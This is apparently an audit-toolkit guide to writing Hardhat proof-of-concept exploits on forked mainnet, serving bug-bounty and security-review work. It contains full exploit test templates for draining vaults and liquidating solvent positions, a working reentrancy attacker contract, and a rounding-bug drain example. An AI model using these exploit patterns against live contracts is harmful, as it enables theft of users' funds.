# Practical Hardhat PoC Template for Vulnerability Demonstration

```
Generate a Hardhat PoC for this vulnerability using Template 1 from POC_TEMPLATE_HARDHAT.md

Vulnerability: Vault.sol withdraw() doesn't check balances
Contract: 0x123...
Exploit: Deposit 100, withdraw 1000
```

## Quick Decision: What Type of Bug?

Before writing code, walk through this decision tree:

```
1. Does the attacker extract value (tokens/ETH)?
   ├─ YES → Template 1 (Value Extraction)
   │   ├─ Direct theft (withdraw more than deposited)
   │   ├─ Price manipulation (oracle, AMM sandwich)
   │   ├─ Flash loan profit
   │   └─ Fee/reward abuse
   │
   └─ NO → Does the attacker cause permanent harm without extracting funds?
       ├─ YES → Template 2 (Invariant Break)
       │   ├─ Access control bypass (call admin/restricted functions)
       │   ├─ Forced liquidation of solvent positions
       │   ├─ Permanent DoS / griefing (freeze withdrawals, block upgrades)
       │   ├─ Fund locking (user cannot withdraw forever)
       │   ├─ State corruption (break storage invariants, poison oracles)
       │   └─ Governance hijack (pass unauthorized proposals)
       │
       └─ NO → Not a vulnerability (or needs stronger impact argument)
```

**Edge cases:**
- **Fund locking** (users can't withdraw): Use Template 2 — the invariant is "users can always withdraw their own funds."
- **Cross-chain bugs**: Use Template 1 or 2 on the affected chain. Fork the chain where the exploit matters.
- **DoS that costs the attacker money**: Use Template 1 if the victim's loss exceeds attacker's cost; otherwise Template 2.
- **Governance manipulation**: Use Template 2. The invariant is the governance threshold / timelock / quorum that was bypassed.

---

## Setup: Hardhat Configuration

### Hardhat 3 (recommended) — `hardhat.config.ts`

```typescript
import { configVariable, defineConfig } from "hardhat/config";
import hardhatToolboxViem from "@nomicfoundation/hardhat-toolbox-viem";

export default defineConfig({
  plugins: [hardhatToolboxViem],
  solidity: {
    version: "0.8.28",
    settings: {
      optimizer: { enabled: true, runs: 200 },
    },
  },
  networks: {
    mainnetFork: {
      type: "edr-simulated",
      chainType: "l1",
      forking: {
        url: configVariable("MAINNET_RPC_URL"),
        blockNumber: 19_500_000, // Pin for deterministic results + caching
      },
    },
  },
  test: {
    mocha: {
      timeout: 600_000, // 10 minutes for fork tests
    },
  },
});
```

> **Hardhat 3 note:** Use `configVariable("KEY")` instead of `process.env.KEY`.
> Values are resolved lazily — only fetched when the network is actually used.
> Store secrets with `npx hardhat keystore set MAINNET_RPC_URL` for encryption.

### Hardhat 2 (legacy) — `hardhat.config.js`

```javascript
require("@nomicfoundation/hardhat-toolbox");
require("dotenv").config();

module.exports = {
  solidity: {
    version: "0.8.20",
    settings: {
      optimizer: { enabled: true, runs: 200 },
    },
  },
  networks: {
    hardhat: {
      forking: {
        url: process.env.MAINNET_RPC_URL,
        blockNumber: 19_500_000,
        enabled: true,
      },
    },
  },
  mocha: {
    timeout: 600_000,
  },
};
```

### `.env` (for Hardhat 2, or as env var fallback for Hardhat 3)

```bash
MAINNET_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY_HERE
```

---

## Template 1: Value Extraction PoC

Use when the attacker steals/drains/mints tokens or ETH.

### Complete Test File

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Exploit: [Vulnerability Name]", function () {
  // ═══════════════════════════════════════════════════════════
  // CONFIGURATION
  // ═══════════════════════════════════════════════════════════
  
  // Mainnet addresses (replace with actual)
  const VULNERABLE_CONTRACT = "0x...";
  const UNDERLYING_TOKEN = "0x...";
  const TOKEN_WHALE = "0x...";  // Find on Etherscan (top holder)
  
  // Test accounts
  const ATTACKER = "0x0000000000000000000000000000000000001337";
  
  // Set the victim to whoever actually loses funds in the exploit.
  // Common choices:
  //   VULNERABLE_CONTRACT  — the protocol vault / pool itself
  //   "0xRealUserAddr"     — a specific on-chain user (LP, depositor)
  // For fork tests, pick the real address that holds the funds at risk.
  const VICTIM = VULNERABLE_CONTRACT;
  
  // Economic parameters
  const INITIAL_TOKENS = ethers.parseUnits("10000", 18);
  const FORK_BLOCK = 19_500_000;
  
  // Contract references
  let vulnerable, token;
  let attacker;
  
  // State tracking — populated in before(), checked after exploit
  let attackerTokenBefore, victimTokenBefore;
  let attackerEthBefore, victimEthBefore;
  
  // ═══════════════════════════════════════════════════════════
  // SETUP
  // ═══════════════════════════════════════════════════════════
  
  before(async function () {
    console.log("\n=== Setting up mainnet fork ===");
    
    // Reset to mainnet fork
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: FORK_BLOCK
        }
      }]
    });
    
    console.log(`Forked at block: ${FORK_BLOCK}`);
    
    // Initialize contracts with minimal ABIs
    const tokenAbi = [
      "function balanceOf(address) view returns (uint256)",
      "function approve(address, uint256) returns (bool)",
      "function transfer(address, uint256) returns (bool)"
    ];
    
    const vulnerableAbi = [
      // Add only functions needed for exploit
      "function deposit(uint256) external",
      "function withdraw(uint256) external",
      "function balanceOf(address) view returns (uint256)"
    ];
    
    token = await ethers.getContractAt(tokenAbi, UNDERLYING_TOKEN);
    vulnerable = await ethers.getContractAt(vulnerableAbi, VULNERABLE_CONTRACT);
    
    // Fund attacker with ETH for gas
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    
    // Get initial tokens from whale
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [TOKEN_WHALE]
    });
    
    const whale = await ethers.getSigner(TOKEN_WHALE);
    await token.connect(whale).transfer(ATTACKER, INITIAL_TOKENS);
    
    await network.provider.request({
      method: "hardhat_stopImpersonatingAccount",
      params: [TOKEN_WHALE]
    });
    
    // Record initial balances (AFTER seed funding, BEFORE exploit)
    attackerTokenBefore = await token.balanceOf(ATTACKER);
    victimTokenBefore = await token.balanceOf(VICTIM);
    attackerEthBefore = await ethers.provider.getBalance(ATTACKER);
    victimEthBefore = await ethers.provider.getBalance(VICTIM);
    
    console.log("Attacker balance:", ethers.formatUnits(attackerTokenBefore, 18));
    console.log("Victim balance:", ethers.formatUnits(victimTokenBefore, 18));
  });
  
  // ═══════════════════════════════════════════════════════════
  // THE EXPLOIT
  // ═══════════════════════════════════════════════════════════
  
  it("exploits vulnerability to drain funds", async function () {
    console.log("\n=== Executing exploit ===");
    
    // Step 1: Approve tokens
    await token.connect(attacker).approve(
      VULNERABLE_CONTRACT,
      ethers.MaxUint256
    );
    
    // Step 2: Deposit to get shares/position
    await vulnerable.connect(attacker).deposit(INITIAL_TOKENS);
    
    // Step 3: Trigger vulnerability
    // Example: Call vulnerable function that allows overdraft
    await vulnerable.connect(attacker).withdraw(
      ethers.parseUnits("20000", 18)  // Withdraw more than deposited
    );
    
    // Verify impact
    const attackerTokenAfter = await token.balanceOf(ATTACKER);
    const victimTokenAfter = await token.balanceOf(VICTIM);
    
    const profit = attackerTokenAfter - attackerTokenBefore;
    const loss = victimTokenBefore - victimTokenAfter;
    
    console.log("\n=== Results ===");
    console.log("Attacker profit:", ethers.formatUnits(profit, 18));
    console.log("Victim loss:", ethers.formatUnits(loss, 18));
    
    // ETH tracking (for exploits that also extract native ETH)
    const attackerEthAfter = await ethers.provider.getBalance(ATTACKER);
    const victimEthAfter = await ethers.provider.getBalance(VICTIM);
    const ethProfit = attackerEthAfter - attackerEthBefore;
    const ethLoss = victimEthBefore - victimEthAfter;
    if (ethProfit > 0n || ethLoss > 0n) {
      console.log("ETH profit:", ethers.formatEther(ethProfit));
      console.log("ETH loss:",   ethers.formatEther(ethLoss));
    }
    
    // Assertions
    expect(profit).to.be.gt(0, "Attacker should profit");
    expect(loss).to.be.gt(0, "Victim should lose funds");
  });
});
```

### What to Customize

1. **Addresses** - Replace with actual mainnet addresses
2. **ABIs** - Add functions you need for your specific exploit
3. **Exploit steps** - Replace deposit/withdraw with your actual attack
4. **Assertions** - Verify your specific impact

---

## Template 2: Invariant Break PoC

Use when attacker triggers unauthorized execution without direct value extraction.

### Complete Test File

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Invariant Break: [Vulnerability Name]", function () {
  // ═══════════════════════════════════════════════════════════
  // CONFIGURATION
  // ═══════════════════════════════════════════════════════════
  
  const VULNERABLE_CONTRACT = "0x...";
  const ATTACKER = "0x0000000000000000000000000000000000001337";
  const VICTIM = "0x0000000000000000000000000000000000002222";
  const FORK_BLOCK = 19_500_000;
  
  let vulnerable, attacker, victim;
  
  // ═══════════════════════════════════════════════════════════
  // SETUP
  // ═══════════════════════════════════════════════════════════
  
  before(async function () {
    console.log("\n=== Setting up mainnet fork ===");
    
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: FORK_BLOCK
        }
      }]
    });
    
    const vulnerableAbi = [
      "function createPosition() external",
      "function liquidate(address) external",
      "function isSolvent(address) view returns (bool)",
      "function getSolvencyRatio(address) view returns (uint256)"
    ];
    
    vulnerable = await ethers.getContractAt(vulnerableAbi, VULNERABLE_CONTRACT);
    
    // Fund both accounts
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      ethers.parseEther("10").toString(16)
    ]);
    await network.provider.send("hardhat_setBalance", [
      VICTIM,
      ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    victim = await ethers.getImpersonatedSigner(VICTIM);
    
    // Setup victim in safe state
    await vulnerable.connect(victim).createPosition();
    
    console.log("Victim solvency:", await vulnerable.isSolvent(VICTIM));
  });
  
  // ═══════════════════════════════════════════════════════════
  // THE EXPLOIT
  // ═══════════════════════════════════════════════════════════
  
  it("liquidates solvent position (breaks invariant)", async function () {
    console.log("\n=== Testing Invariant ===");
    console.log("RULE: Only insolvent positions can be liquidated");
    
    // PRE-CONDITION: Verify the invariant holds BEFORE the attack
    const isSolventBefore = await vulnerable.isSolvent(VICTIM);
    expect(isSolventBefore).to.be.true;
    console.log("Invariant holds BEFORE attack: true");
    
    console.log("\n=== Executing unauthorized liquidation ===");
    
    // This should fail but won't due to bug
    await vulnerable.connect(attacker).liquidate(VICTIM);
    
    // POST-CONDITION: Verify the invariant is now BROKEN
    const isSolventAfter = await vulnerable.isSolvent(VICTIM);
    
    console.log("\n=== Results ===");
    console.log("Invariant holds AFTER  attack:", isSolventAfter ? "true (BUG NOT TRIGGERED)" : "FALSE — BROKEN");
    
    // Measure downstream impact if applicable
    // const penalty = await vulnerable.calculateLiquidationPenalty(VICTIM);
    // console.log("Liquidation penalty (wei):", penalty.toString());
    
    expect(isSolventAfter).to.be.false;
  });
});
```

---

## Common Patterns

### Pattern 1: Impersonate Account

```javascript
// Modern approach (preferred) — one step, auto-funded
const signer = await ethers.getImpersonatedSigner(address);
await token.connect(signer).transfer(recipient, amount);
// No need to stop impersonation — getImpersonatedSigner handles it.

// Manual approach (if you need fine-grained control)
await network.provider.request({
  method: "hardhat_impersonateAccount",
  params: [address]
});
const manualSigner = await ethers.getSigner(address);
await token.connect(manualSigner).transfer(recipient, amount);
await network.provider.request({
  method: "hardhat_stopImpersonatingAccount",
  params: [address]
});
```

### Pattern 2: Set Balance

```javascript
// Give account ETH
await network.provider.send("hardhat_setBalance", [
  account,
  ethers.parseEther("100").toString(16)  // 100 ETH
]);
```

### Pattern 3: Time & Block Manipulation

```javascript
// Advance time by 1 day AND advance block number
const block = await ethers.provider.getBlock("latest");
await network.provider.send("evm_setNextBlockTimestamp", [
  block.timestamp + 86400
]);
await network.provider.send("evm_mine");

// Bulk-advance many blocks at once (much faster than calling evm_mine in a loop)
// Mine 100 blocks with 12-second intervals:
await network.provider.send("hardhat_mine", [
  "0x64",  // 100 blocks (hex)
  "0xc"    // 12 seconds between each (hex)
]);
```

### Pattern 4: Gas Tracking

```javascript
const tx = await vulnerable.connect(attacker).exploit();
const receipt = await tx.wait();

console.log("Gas used:", receipt.gasUsed.toString());
console.log("Gas price:", receipt.gasPrice.toString());

const gasCost = receipt.gasUsed * receipt.gasPrice;
console.log("ETH spent on gas:", ethers.formatEther(gasCost));

// Full EVM trace (opcode-level) for deep debugging:
const trace = await network.provider.request({
  method: "debug_traceTransaction",
  params: [receipt.hash]
});
console.log("Trace steps:", trace.structLogs.length);
```

### Pattern 5: Multi-Transaction Attack

```javascript
// Transaction 1
await vulnerable.connect(attacker).setupAttack();

// Advance block + timestamp (simulate real block production)
await network.provider.send("evm_setNextBlockTimestamp", [
  (await ethers.provider.getBlock("latest")).timestamp + 12
]);
await network.provider.send("evm_mine");

// Transaction 2
await vulnerable.connect(attacker).executeAttack();

// Advance again
await network.provider.send("evm_setNextBlockTimestamp", [
  (await ethers.provider.getBlock("latest")).timestamp + 12
]);
await network.provider.send("evm_mine");

// Transaction 3
await vulnerable.connect(attacker).extractProfit();
```

### Pattern 6: Reentrancy Attack

Reentrancy requires a malicious contract with a callback. Deploy it in the test:

```javascript
// In your test's before():
const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
const attackContract = await ReentrancyAttacker.deploy(VULNERABLE_CONTRACT);

// In your test:
it("reenters withdraw to drain vault", async function () {
  const vaultBefore = await ethers.provider.getBalance(VULNERABLE_CONTRACT);
  
  // Fund the attack contract, deposit, then trigger reentrancy
  await attackContract.attack({ value: ethers.parseEther("1") });
  
  const vaultAfter = await ethers.provider.getBalance(VULNERABLE_CONTRACT);
  console.log("Vault drained:", ethers.formatEther(vaultBefore - vaultAfter));
  expect(vaultAfter).to.be.lt(vaultBefore);
});
```

The attack contract (deploy alongside your test):

```solidity
// contracts/test/ReentrancyAttacker.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract ReentrancyAttacker {
    IVulnerable target;
    uint256 count;

    constructor(address _target) { target = IVulnerable(_target); }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (count < 5 && address(target).balance > 0) {
            count++;
            target.withdraw(msg.value);
        }
    }
}
```

### Pattern 7: State Snapshot & Revert

Use `evm_snapshot` / `evm_revert` to checkpoint and reset state between exploit phases:

```javascript
// Take a snapshot before the exploit
const snapshotId = await network.provider.send("evm_snapshot");

// Run exploit attempt #1
await vulnerable.connect(attacker).exploit();

// Revert to pre-exploit state (snapshot can only be reverted ONCE)
await network.provider.send("evm_revert", [snapshotId]);

// Take a fresh snapshot if you need to revert again
const snapshotId2 = await network.provider.send("evm_snapshot");

// Run exploit attempt #2 with different parameters
await vulnerable.connect(attacker).exploitAlternative();
```

---

## Running Your Tests

### Hardhat 3

```bash
# Run all tests on default network
npx hardhat test nodejs

# Run on a specific forked network (defined in hardhat.config.ts)
npx hardhat test nodejs --network mainnetFork

# Run a specific test file
npx hardhat test nodejs test/Exploit.test.ts

# Run Solidity tests (Forge-compatible .t.sol files)
npx hardhat test solidity

# Gas statistics for all contract functions
npx hardhat test nodejs --gas-stats

# Code coverage
npx hardhat test nodejs --coverage
```

### Hardhat 2

```bash
# Basic run
npx hardhat test

# Specific test by grep
npx hardhat test --grep "exploits vulnerability"

# With verbose logging (shows console.log output)
npx hardhat test --verbose
```

### With Gas Report (Hardhat 2)

```bash
# Install gas reporter
npm install --save-dev hardhat-gas-reporter

# Add to hardhat.config.js:
# require("hardhat-gas-reporter");

npx hardhat test
```

### Debug Logging

For deep Hardhat internals debugging:

```bash
# Show all debug logs
DEBUG='hardhat*' npx hardhat test nodejs

# Filter to just Solidity-related logs
DEBUG='hardhat:core:solidity:*' npx hardhat test nodejs
```

---

## Rules for Realistic PoCs

### ✅ DO:

1. **Fork mainnet** - Use real deployed contracts at a pinned block
2. **Use `getImpersonatedSigner()`** - For whale tokens or testing different roles
3. **Minimal ABIs** - Only include functions you actually call
4. **Show the numbers** - Log balances before/after with `ethers.formatUnits()`
5. **Pin the fork block** - For deterministic results and caching
6. **Use `configVariable()` (HH3)** - Never hardcode RPC URLs or API keys

### ❌ DON'T:

1. **Don't use `hardhat_setStorageAt` on target** - Modifying the audited contract's storage invalidates the PoC
2. **Don't mock in-scope contracts** - Test the real thing on a fork
3. **Don't use unrealistic amounts** - Keep token amounts reasonable
4. **Don't skip setup steps** - Show the full attack path
5. **Don't give attacker special powers** - No admin roles, no direct storage writes on target
6. **Don't forget timestamps** - When using `evm_mine`, also advance `evm_setNextBlockTimestamp`

### Special Case: When `hardhat_setStorageAt` Is OK

`hardhat_setStorageAt` is acceptable **only on out-of-scope / external dependency contracts** — never on the contract you are proving is vulnerable. If you set storage on the target, a judge can dismiss the PoC as fabricated state.

**Allowed uses:**
- Setting state on an **oracle** or **price feed** to model a historical price
- Setting state on an **external dependency** that could have reached that state through normal usage
- Setting a **non-target** contract's storage to recreate conditions that existed at a past block

**Never allowed:**
- `hardhat_setStorageAt` on the `VULNERABLE_CONTRACT` address — this invalidates the PoC

```javascript
// ✅ ACCEPTABLE: Set state on an OUT-OF-SCOPE oracle to model a past price
const ORACLE = "0x..."; // External price feed, NOT the target
const stalePrice = 1500n * 10n ** 8n; // $1500, 8 decimals

await network.provider.send("hardhat_setStorageAt", [
  ORACLE,           // ← NOT VULNERABLE_CONTRACT
  "0x0",            // price slot
  ethers.zeroPadValue(ethers.toBeHex(stalePrice), 32)
]);

// Now show the bug: the TARGET doesn't revalidate the stale oracle
await vulnerable.connect(attacker).borrow(ethers.parseEther("1000"));

// ❌ NEVER: hardhat_setStorageAt on the TARGET contract
// This INVALIDATES the PoC:
// await network.provider.send("hardhat_setStorageAt", [VULNERABLE_CONTRACT, ...]);
```

> **Tip:** Prefer forking at a block where the precondition already exists
> naturally, so you don't need `hardhat_setStorageAt` at all.

---

## Complete Example: Rounding Bug Exploit

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Rounding Exploit in Vault", function () {
  // ── Addresses ────────────────────────────────────────────
  const VAULT   = "0x123...";  // Real vault address (target contract)
  const USDC    = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const WHALE   = "0xabc...";  // Top USDC holder (funding source)
  const ATTACKER = "0x1337...";  // Fresh EOA
  const VICTIM  = VAULT;  // Vault itself loses tokens
  
  let vault, usdc, attacker;
  
  before(async function () {
    // Fork mainnet at a pinned block for reproducibility
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: 19_500_000  // Always pin!
        }
      }]
    });
    
    // Get contracts
    vault = await ethers.getContractAt([
      "function deposit(uint256, address) returns (uint256)",
      "function withdraw(uint256, address, address) returns (uint256)",
      "function maxWithdraw(address) view returns (uint256)"
    ], VAULT);
    
    usdc = await ethers.getContractAt([
      "function balanceOf(address) view returns (uint256)",
      "function approve(address, uint256) returns (bool)",
      "function transfer(address, uint256) returns (bool)"
    ], USDC);
    
    // Setup attacker — fund gas only, no special privileges
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      "0x" + ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    
    // Get USDC from whale (funding source — not the victim)
    const whale = await ethers.getImpersonatedSigner(WHALE);
    const amount = ethers.parseUnits("1000000", 6);  // $1M USDC
    await usdc.connect(whale).transfer(ATTACKER, amount);
    
    await network.provider.request({
      method: "hardhat_stopImpersonatingAccount",
      params: [WHALE]
    });
  });
  
  it("exploits rounding error to profit", async function () {
    // ── Snapshot BEFORE state ──────────────────────────────
    const victimTokenBefore  = await usdc.balanceOf(VICTIM);
    const attackerTokenBefore = await usdc.balanceOf(ATTACKER);
    const attackerEthBefore  = await ethers.provider.getBalance(ATTACKER);
    
    console.log("--- BEFORE ---");
    console.log("Victim USDC :", ethers.formatUnits(victimTokenBefore, 6));
    console.log("Attacker USDC:", ethers.formatUnits(attackerTokenBefore, 6));
    
    // ── Execute exploit ────────────────────────────────────
    const depositAmount = ethers.parseUnits("1000000", 6);
    
    await usdc.connect(attacker).approve(VAULT, ethers.MaxUint256);
    await vault.connect(attacker).deposit(depositAmount, ATTACKER);
    
    // Withdraw 1 wei less to trigger rounding bug
    const maxWithdraw = await vault.maxWithdraw(ATTACKER);
    await vault.connect(attacker).withdraw(maxWithdraw - 1n, ATTACKER, ATTACKER);
    
    // ── Snapshot AFTER state ───────────────────────────────
    const victimTokenAfter   = await usdc.balanceOf(VICTIM);
    const attackerTokenAfter = await usdc.balanceOf(ATTACKER);
    const attackerEthAfter   = await ethers.provider.getBalance(ATTACKER);
    
    // ── Report ─────────────────────────────────────────────
    const attackerProfit = attackerTokenAfter - attackerTokenBefore;
    const victimLoss     = victimTokenBefore - victimTokenAfter;
    const gasCost        = attackerEthBefore - attackerEthAfter;
    
    console.log("--- AFTER ---");
    console.log("Victim USDC :", ethers.formatUnits(victimTokenAfter, 6));
    console.log("Attacker USDC:", ethers.formatUnits(attackerTokenAfter, 6));
    console.log("--- RESULT ---");
    console.log("Attacker profit:", ethers.formatUnits(attackerProfit, 6), "USDC");
    console.log("Victim loss    :", ethers.formatUnits(victimLoss, 6), "USDC");
    console.log("Gas cost       :", ethers.formatEther(gasCost), "ETH");
    
    // ── Assert ─────────────────────────────────────────────
    expect(attackerProfit).to.be.gt(0n, "Attacker must profit");
    expect(victimLoss).to.be.gt(0n, "Victim must lose funds");
    expect(attackerProfit).to.be.gt(gasCost, "Profit must exceed gas");
  });
});
```

---

## Pre-Submission Checklist

- [ ] **Fork block pinned** — `blockNumber` is hardcoded, not `"latest"`
- [ ] **Victim identified** — `VICTIM` constant is set; before/after snapshots logged
- [ ] **No target contract storage writes** — `hardhat_setStorageAt` / `vm.store` only on out-of-scope helpers
- [ ] **Attacker has no special powers** — funded with ETH for gas only, no admin roles
- [ ] **Profit exceeds gas** — `attackerProfit > gasCost` asserted
- [ ] **Assertions present** — `expect()` calls prove the exploit worked
- [ ] **Reproducible** — another engineer can run `npx hardhat test` and see the same result
- [ ] **No stale env vars** — using `configVariable()` (HH3) or `.env` + `dotenv` (HH2)

---

## Summary

| Template | When to use |
|----------|-------------|
| **Template 1 — Value Extraction** | Theft, price manipulation, fee abuse, flash-loan exploits |
| **Template 2 — Invariant Break** | Access-control bypass, state corruption, governance hijack |

### Pattern cheat-sheet

| # | Pattern | Key API |
|---|---------|--------|
| 1 | Impersonate whale / EOA | `getImpersonatedSigner()` |
| 2 | Fund attacker | `hardhat_setBalance` |
| 3 | Time & block manipulation | `evm_setNextBlockTimestamp`, `hardhat_mine` |
| 4 | Gas tracking | `debug_traceTransaction`, `--gas-stats` |
| 5 | Multi-transaction | Separate `it()` blocks + `evm_mine` |
| 6 | Reentrancy | Deploy `ReentrancyAttacker.sol` + JS test |
| 7 | Snapshot / Revert | `evm_snapshot`, `evm_revert` |

**The PoC must answer:** *"Can an attacker with no special privileges exploit this on mainnet?"*

If the test passes, the answer is **yes** — and you've written a good PoC.
